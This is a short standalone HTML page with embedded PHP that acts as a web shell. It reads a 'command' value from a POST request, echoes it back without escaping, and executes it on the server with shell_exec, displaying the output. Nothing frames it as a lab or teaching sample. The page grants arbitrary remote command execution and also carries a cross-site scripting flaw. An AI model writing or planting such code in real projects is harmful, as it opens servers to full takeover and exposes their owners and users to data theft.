<!DOCTYPE html>
<html>
<body>
<style>
div {
    padding: 20px;
    border: 1px solid #4CAF50;
white-space: pre-wrap;.
}
</style>
<div>Output of:
<?php
echo $_POST["command"] ," ";
echo "</div><div>";
echo shell_exec($_POST["command"]);

?> 
</div>
</body>
</html>